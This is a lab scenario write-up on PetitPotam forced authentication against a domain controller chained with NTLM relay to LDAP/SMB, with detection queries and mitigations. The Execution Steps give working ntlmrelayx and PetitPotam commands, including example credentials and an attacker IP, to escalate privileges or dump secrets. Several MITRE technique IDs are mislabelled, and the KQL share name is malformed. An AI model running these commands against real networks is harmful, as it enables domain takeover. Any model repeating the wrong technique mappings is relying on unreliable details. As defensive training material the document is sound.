# Attack Scenario: Coercion via PetitPotam
PetitPotam abuses MS-EFSRPC (Encrypting File System Remote Protocol) to coerce an authenticated Windows host (typically a Domain Controller or File Server) into making an SMB connection to an attacker-controlled machine. This coerced authentication can be relayed via NTLM Relay to gain elevated access.

## MITRE ATT&CK Techniques:

T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning

T1557.002 – SMB/NTLM Relay

T1556.004 – Credential Relay via Coerced Authentication

## Lab Environment
- **Attacker machine:** attacker-vm (Kali or Ubuntu)
- **Target machine:** dc01.internal.lab or any file server with EFSRPC enabled
- **Relay target:** LDAP/SMB/HTTP service on a second internal host
- **Tools:** PetitPotam (Python version), ntlmrelayx

## Preconditions:

- Target system has EFSRPC service exposed (usually over \\target\pipe\efsrpc)

- No NTLM signing enforced on the relay target (e.g., LDAP or SMB)

## Objectives
- Force a victim machine to authenticate to attacker via SMB

- Relay the NTLM authentication to a third-party target (LDAP/SMB)

- Perform privileged operations (e.g., add user, dump secrets)

## Execution Steps
### 1. Set Up NTLM Relay (passive listener)

```ntlmrelayx.py -t ldap://dc01.internal.lab --no-wcf-server --escalate-user```
Or:

```ntlmrelayx.py -t smb://target.internal.lab -smb2support```
### 2. Trigger Authentication via PetitPotam
Clone and run:

```git clone https://github.com/topotam/PetitPotam
cd PetitPotam
python3 PetitPotam.py -u USER -p PASS -d internal.lab <target-ip> <attacker-ip>```

Note: Authenticated coercion works more reliably. Null sessions are usually blocked.

Example:

```python3 PetitPotam.py -u svc-backup -p P@ssw0rd1 -d internal.lab 10.0.0.10 10.0.0.99```
### 3. Confirm Relay
If successful, NTLMRelayX will show relayed authentication and resulting action (e.g., user added, hash dumped, shell granted).

## Detection Guidance
### Logs and Indicators
Event ID 4624 with LogonProcessName = NtLmSsp from unusual source IP

Event ID 5140 indicating share access from non-standard clients

High volume of failed or anomalous named pipe connections

### KQL – Suspicious Named Pipe Access

```
SecurityEvent
| where EventID == 5145
| where ShareName endswith "$IPC"
| where RelativeTargetName has "efsrpc"
```

### Defender for Identity
Alert: "Suspicious Kerberos-based authentication attempt"

Alert: "SMB relay attack attempt detected"

## Mitigations
- Block outbound SMB where not needed

- Require SMB and LDAP signing on all internal servers

- Disable the EFS service (if unused)

- Patch vulnerable systems (PetitPotam was mitigated by MS in patches starting mid-2021)

- Example GPO to disable EFS:

```Computer Configuration > Windows Settings > Security Settings > Public Key Policies > Encrypting File System > Do not allow```

## References
https://github.com/topotam/PetitPotam

https://dirkjanm.io/relaying-ntlm-to-ldap-with-ldaps-in-2020/

https://attack.mitre.org/techniques/T1557/002/

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942

## Navigation
[Back to Lab Index:](../../README.md)
[Related: NTLM Relay](./NTLM-relay.md)